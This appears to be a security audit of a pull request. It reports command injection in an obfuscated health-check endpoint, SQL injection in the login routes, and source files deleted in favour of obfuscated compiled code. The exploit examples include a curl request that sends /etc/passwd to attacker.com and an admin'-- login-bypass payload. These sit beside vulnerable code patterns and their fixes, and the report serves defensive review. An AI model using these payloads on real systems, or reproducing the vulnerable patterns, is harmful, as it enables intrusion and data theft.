## Vuln 1: Command Injection — `server/dist/index.js` (`/api/health` endpoint)

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `command_injection`

### Description

The compiled, obfuscated `server/dist/index.js` (the file actually executed via `npm run start`) imports `child_process` and passes the unsanitized `req.query.service` query parameter directly to `child_process.exec()`. The deobfuscated logic is equivalent to:

```js
const service = req.query.service || 'api.themoviedb.org';
exec(`ping -c 1 -W 2 ${service}`, (err, stdout) => { ... });
```

Because `exec()` passes its argument to `/bin/sh -c`, any shell metacharacter in the `service` parameter is interpreted. The TypeScript source (`server/index.ts`) was deleted in this PR, leaving only this obfuscated, non-auditable compiled artifact.

### Exploit Scenario

An unauthenticated attacker sends:

```
GET /api/health?service=;curl%20https://attacker.com/$(cat%20/etc/passwd)
```

This executes arbitrary shell commands with the privileges of the Node.js process, enabling full server compromise (RCE), data exfiltration, and lateral movement.

### Recommendation

Remove the `child_process.exec` health check entirely, or replace it with a safe HTTP-based reachability check (e.g., using `fetch` with a strict allowlist of target domains). Never pass user-supplied strings to `exec`, `spawn`, or `execSync` without validated allowlisting.

## Vuln 2: SQL Injection — `server/dist/routes/auth.js` (signup & signin endpoints)

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `sql_injection`

### Description

The obfuscated `server/dist/routes/auth.js` (the live running code) builds SQL queries via string concatenation, embedding the user-supplied `username` (from `req.body`) directly into query strings passed to `db.prepare()`. Using `db.prepare()` with an already-interpolated string provides **no injection protection**. The deobfuscated logic is equivalent to:

```js
// Signup
db.prepare(`INSERT INTO users (username, password_hash) VALUES ('${username}', '${hash}')`).run();

// Signin
db.prepare(`SELECT id, username, password_hash FROM users WHERE username = '${username}'`).get();
```

Both endpoints are unauthenticated. The TypeScript source (`server/routes/auth.ts`) was deleted, leaving only the obfuscated compiled version.

### Exploit Scenario

- **Authentication bypass:** Attacker submits `username: admin'--` to the signin endpoint; the resulting query becomes `SELECT ... WHERE username = 'admin'--'`, returning the admin account without a valid password.
- **Data exfiltration:** With UNION-based injection or SQLite's `ATTACH` functionality, an attacker can read arbitrary database tables.

### Recommendation

Use parameterized bindings with `?` placeholders throughout:

```js
// Secure signup
db.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)').run(username, hash);

// Secure signin
db.prepare('SELECT id, username, password_hash FROM users WHERE username = ?').get(username);
```

## Additional Concern: Deleted Sources + Obfuscated Compiled Code

This PR deletes all TypeScript source files (`server/index.ts`, `server/routes/*.ts`, `server/middleware/auth.ts`) and commits heavily obfuscated compiled JavaScript under `server/dist/` — which is force-included via `.gitignore`'s `!server/dist` rule. The `javascript-obfuscator` package is listed as a **production dependency**. This pattern eliminates the ability to audit or verify the code that actually runs, and the two vulnerabilities above were only discoverable because the obfuscation was partial enough to reveal `child_process` references and SQL string fragments. Restoring auditable source files alongside any build artifacts is strongly recommended.
